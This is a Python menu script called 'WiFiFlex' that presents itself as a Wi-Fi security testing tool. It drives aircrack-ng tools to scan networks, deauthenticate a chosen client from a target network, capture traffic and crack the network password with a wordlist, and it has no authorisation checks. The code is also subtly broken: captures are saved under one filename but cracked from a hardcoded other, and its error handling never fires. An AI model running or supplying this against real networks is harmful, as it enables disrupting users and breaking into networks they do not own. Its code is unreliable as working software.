import subprocess
import os
import time
import pyshark
from scapy.all import *

def print_logo():
    print("""
 _       ___ _______    ________         
| |     / (_) ____(_)  / ____/ /__  _  __
| | /| / / / /_  / /  / /_  / / _ \| |/_/
| |/ |/ / / __/ / /  / __/ / /  __/>  <  
|__/|__/_/_/   /_/  /_/   /_/\___/_/|_|  
                                         
Welcome to WiFiFlex - Your Ultimate Wi-Fi Security Testing Tool!\n
""")

def scan_wifi_networks():
    try:
        print("Scanning for Wi-Fi networks...")
        subprocess.run(["airodump-ng", "wlan0"])
    except subprocess.CalledProcessError as e:
        print("Error during scanning:", e)

def deauthenticate_client(bssid, client_mac):
    try:
        print("Deauthenticating client from network...")
        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, "wlan0"])
    except subprocess.CalledProcessError as e:
        print("Error during deauthentication:", e)

def capture_traffic():
    filename = input("Enter the filename to save captured traffic (without extension): ")
    try:
        print("Capturing traffic from the network...")
        capture = pyshark.LiveCapture(interface='wlan0')
        capture.sniff(timeout=10)
        capture.export_pcap(filename + '.pcap')
    except pyshark.capture.capture.TSharkCrashException as e:
        print("Error during packet capture:", e)

def crack_wifi_password(bssid):
    wordlist = input("Enter the path to the wordlist file: ")
    try:
        print("Cracking Wi-Fi password...")
        subprocess.run(["aircrack-ng", "-w", wordlist, "-b", bssid, "captured_traffic.pcap"])
    except subprocess.CalledProcessError as e:
        print("Error during password cracking:", e)

def generate_report():
    try:
        print("Generating detailed report...")
        subprocess.run(["wifireport", "captured_traffic.pcap"])
    except subprocess.CalledProcessError as e:
        print("Error during report generation:", e)

def main_menu():
    print_logo()
    while True:
        print("\n1. Scan for Wi-Fi networks")
        print("2. Deauthenticate a client from a network")
        print("3. Capture traffic from a network")
        print("4. Crack Wi-Fi password")
        print("5. Generate detailed report")
        print("6. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            scan_wifi_networks()
        elif choice == "2":
            bssid = input("Enter the BSSID of the target network: ")
            client_mac = input("Enter the MAC address of the client to deauthenticate: ")
            deauthenticate_client(bssid, client_mac)
        elif choice == "3":
            capture_traffic()
        elif choice == "4":
            bssid = input("Enter the BSSID of the target network: ")
            crack_wifi_password(bssid)
        elif choice == "5":
            generate_report()
        elif choice == "6":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
